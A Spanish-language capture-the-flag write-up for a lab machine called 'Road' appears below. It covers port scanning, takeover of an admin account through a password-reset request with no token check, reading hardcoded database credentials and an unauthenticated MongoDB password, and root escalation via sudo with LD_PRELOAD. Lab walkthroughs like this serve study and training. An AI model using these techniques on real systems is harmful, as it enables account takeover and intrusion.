# Road

## 1. Introducción

### 1.1 Antecedentes

La máquina **Road** presenta una cadena de explotación enfocada en fallos de lógica en aplicaciones web, exposición de servicios internos y una configuración insegura de `sudo` que permite escalada de privilegios.

El compromiso completo del sistema se logró encadenando múltiples vulnerabilidades desde la capa web hasta el sistema operativo.

### 1.2 Objetivos

Los objetivos del análisis fueron:

- Identificar vulnerabilidades en la aplicación web.
- Obtener acceso inicial al sistema.
- Escalar privilegios hasta root.
- Documentar la cadena completa de explotación.

---

## 2. Enumeración

### 2.1 Escaneo de Puertos

Se realizó un escaneo completo:

```
nmap -sCV -p- <IP>
```

Puertos relevantes detectados:

- 22/tcp – SSH
- 80/tcp – HTTP

El servidor web reportaba:

```
Apache/2.4.41 (Ubuntu)
```

### 2.2 Enumeración Web

En la aplicación web se identificó el endpoint:

```
/v2/lostpassword.php
```

Interceptando la solicitud con Burp Suite se observó:

```
POST /v2/lostpassword.php

uname=<email>
npass=<password>
cpass=<password>
ci_csrf_token=
```

El token CSRF se enviaba vacío y no existía validación del flujo de recuperación.

### 2.3 Análisis del Código

Desde la shell obtenida posteriormente, se revisó el código fuente:

```
$con = mysqli_connect('localhost','root','ThisIsSecurePassword!');
```

Se identificaron credenciales hardcodeadas en el código.

### 2.4 Enumeración de Servicios Internos

Se listaron servicios locales:

```
ss-tulnp
```

Se detectó MongoDB en:

```
127.0.0.1:27017
```

Acceso sin autenticación:

```
mongo
```

Bases disponibles:

```
admin
backup
config
local
```

En la base `backup` se encontró:

```
db.user.find()
```

Resultado relevante:

```
{
  "Name": "webdeveloper",
  "Pass": "BahamasChapp123!@#"
}
```

---

## 3. Explotación

### 3.1 Vulnerabilidad de Lógica en Reset de Contraseña

El endpoint permitía modificar la contraseña de cualquier usuario enviando directamente:

```
uname=admin@sky.thm
npass=<nuevo_password>
cpass=<nuevo_password>
```

Sin validación de token ni confirmación por correo.

Esto permitió tomar control de la cuenta administrativa.

### 3.2 Obtención de Shell

Desde el panel administrativo se logró ejecución remota de comandos, obteniendo acceso como:

```
www-data
```

### 3.3 Pivot a Usuario Local

Usando las credenciales encontradas en MongoDB:

```
BahamasChapp123!@#
```

Se realizó:

```
su webdeveloper
```

Acceso exitoso al usuario `webdeveloper`.

---

## 4. Post-Explotación

### 4.1 Enumeración de Sudo

```
sudo -l
```

Resultado:

```
(ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
env_keep+=LD_PRELOAD
```

El sistema permitía conservar la variable `LD_PRELOAD` al ejecutar el binario como root.

### 4.2 Escalada de Privilegios

La presencia de:

```
env_keep+=LD_PRELOAD
```

permitía cargar una librería compartida personalizada al ejecutar:

```
sudo LD_PRELOAD=<library> /usr/bin/sky_backup_utility
```

Esto posibilitó la ejecución de código con privilegios root y la obtención de una shell privilegiada.

Verificación:

```
whoami
```

Resultado:

```
root
```

### 4.3 Flags

- `/home/webdeveloper/user.txt`
- `/root/root.txt`
